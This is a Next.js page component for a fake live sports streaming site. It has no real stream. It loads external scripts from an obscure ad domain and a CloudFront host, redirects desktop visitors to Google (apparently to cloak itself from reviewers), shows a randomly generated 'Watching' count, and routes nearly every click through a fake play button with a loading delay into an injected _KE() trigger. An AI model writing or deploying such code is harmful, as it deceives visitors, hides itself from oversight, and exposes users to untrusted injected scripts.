"use client";
import { useEffect, useState } from "react";
import matchesData from "@/data/matches.json";

export default function MatchPage({ params }) {
  const { slug } = params;
  const [match, setMatch] = useState(null);

  useEffect(() => {
    // Cari data berdasarkan slug
    const found = matchesData.find(
      (m) =>
        m.title.replace(/\s+/g, "-").toLowerCase() ===
        decodeURIComponent(slug).toLowerCase()
    );
    if (found) setMatch(found);
    else window.location.href = "/hd/404";
  }, [slug]);

  useEffect(() => {
    // Load semua script eksternal
    const s1 = document.createElement("script");
    s1.src =
      "//signingunwilling.com/63/1d/71/631d718e79ef6f18378d6cc0ddcea5cf.js";
    s1.async = true;
    document.head.appendChild(s1);

    const s2 = document.createElement("script");
    s2.innerHTML = `var qzyyM_GmH_UnThec={"it":4566373,"key":"a7306"};`;
    document.head.appendChild(s2);

    const s3 = document.createElement("script");
    s3.src = "https://d1y0yks1k8t5m5.cloudfront.net/ff3d778.js";
    s3.async = true;
    document.head.appendChild(s3);

    // Jika desktop → redirect ke Google
    if (
      !/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(
        navigator.userAgent
      )
    ) {
      window.location.href = "https://www.google.com";
    }

    // Tambah fungsi _KE()
    const original_KE = window._KE;
    window._KE = function () {
      const btn = document.querySelector(".play-btn");
      if (!btn) return;
      if (btn.classList.contains("loading")) return;

      btn.classList.add("loading");
      btn.querySelector(".material-icons").textContent = "autorenew";

      setTimeout(() => {
        btn.classList.remove("loading");
        btn.querySelector(".material-icons").textContent = "play_arrow";
        if (typeof original_KE === "function") original_KE();
      }, 5000);
    };

    // Random viewers counter
    function randomViewers() {
      const viewersEl = document.querySelector(".live-badge .viewers");
      if (!viewersEl) return;

      let base = 4800 + Math.floor(Math.random() * 1000);
      let suffix = base > 999 ? (base / 1000).toFixed(1) + "K" : base;
      viewersEl.textContent = `• ${suffix} Watching`;
    }
    setInterval(randomViewers, Math.floor(Math.random() * 3000) + 3000);
    randomViewers();
  }, []);

  if (!match) return null; // biar gak error sebelum data ketemu

  return (
    <html lang="en">
      <head>
        <meta charSet="UTF-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <title>{match.title} - Tigoal Live HD</title>
        <meta name="google" content="notranslate" />
        <meta property="og:title" content={match.title} />
        <meta
          property="og:description"
          content={`${match.title_tim_a} vs ${match.title_tim_b} - Live Stream`}
        />
        <meta property="og:image" content={match.img_thumb} />
        <meta
          property="og:url"
          content={`https://livehd-seven.vercel.app/hd/${slug}`}
        />
        <meta name="twitter:card" content="summary_large_image" />
        <link rel="icon" type="image/x-icon" href="/ico.jpg" />
        <link
          href="https://fonts.googleapis.com/css2?family=LXGW+Marker+Gothic&family=Poppins:wght@400;600&display=swap"
          rel="stylesheet"
        />
        <link
          href="https://fonts.googleapis.com/icon?family=Material+Icons"
          rel="stylesheet"
        />
        <link href="/style.css" rel="stylesheet" />
      </head>
      <body className="notranslate">
        <header onClick={() => window._KE()}>
          <div className="logo">
            <img src="/logo.png" alt="Logo" />
            <span>ClTv Sports</span>
          </div>
          <div className="menu-icons">
            <span className="material-icons">menu</span>
            <span className="material-icons">settings</span>
          </div>
        </header>

        <section className="match">
          <h2>Live Match: {match.title}</h2>
          <div className="teams">
            <div className="team">
              <img src={match.url_img_a} alt={match.title_tim_a} />
              <span>{match.title_tim_a}</span>
            </div>
            <div className="vs">VS</div>
            <div className="team">
              <img src={match.url_img_b} alt={match.title_tim_b} />
              <span>{match.title_tim_b}</span>
            </div>
          </div>
        </section>

        <div
          className="player"
          style={{ backgroundImage: `url('${match.img_thumb}')` }}
        >
          <div className="live-badge">
            LIVE <span className="viewers">• 5.2K Watching</span>
          </div>
          <div className="overlay"></div>
          <div className="play-btn" onClick={() => window._KE()}>
            <span className="material-icons">play_arrow</span>
          </div>

          <div className="video-controls">
            <div className="quality">480P</div>
            <span className="material-icons control-btn">volume_up</span>
            <span className="material-icons control-btn">fullscreen</span>
          </div>
        </div>

        <a href="#" className="watch-now" onClick={() => window._KE()}>
          Stream 720 [HD]
        </a>

        <div className="actions" onClick={() => window._KE()}>
          <div className="btn apk">
            <span className="material-icons">android</span> APK
          </div>
          <div className="btn tv">
            <span className="material-icons">tv</span> TV
          </div>
          <div className="btn tg">
            <span className="material-icons">send</span> TG
          </div>
        </div>

        <div className="ad-area">
          <div className="ad-title">Advertisement</div>
          <div className="ad-banner">
            <script
              async
              data-cfasync="false"
              src="//signingunwilling.com/3911d811a20e71a5214546d08cc0afaf/invoke.js"
            ></script>
            <div id="container-3911d811a20e71a5214546d08cc0afaf"></div>
          </div>
        </div>

        <div className="menu-area" onClick={() => window._KE()}>
          <h3>ClTv Sports</h3>
          <div className="menu-grid">
            <div className="menu-item">
              <span className="material-icons">sports_soccer</span> Football
            </div>
            <div className="menu-item">
              <span className="material-icons">sports_basketball</span>{" "}
              Basketball
            </div>
            <div className="menu-item">
              <span className="material-icons">sports_tennis</span> Tennis
            </div>
            <div className="menu-item">
              <span className="material-icons">sports_motorsports</span>{" "}
              Motorsport
            </div>
            <div className="menu-item">
              <span className="material-icons">sports_cricket</span> Cricket
            </div>
            <div className="menu-item">
              <span className="material-icons">sports_rugby</span> Rugby
            </div>
            <div className="menu-item">
              <span className="material-icons">sports_kabaddi</span> Fight
            </div>
            <div className="menu-item">
              <span className="material-icons">sports_volleyball</span>{" "}
              Volleyball
            </div>
            <div className="menu-item">
              <span className="material-icons">sports_hockey</span> Hockey
            </div>
            <div className="menu-item">
              <span className="material-icons">sports_gymnastics</span>{" "}
              Badminton
            </div>
            <div className="menu-item">
              <span className="material-icons">directions_bike</span> Bicycle
            </div>
            <div className="menu-item">
              <span className="material-icons">sports_baseball</span> Baseball
            </div>
          </div>
        </div>

        <footer>© 2025 ClTv Sports. All rights reserved.</footer>
      </body>
    </html>
  );
}
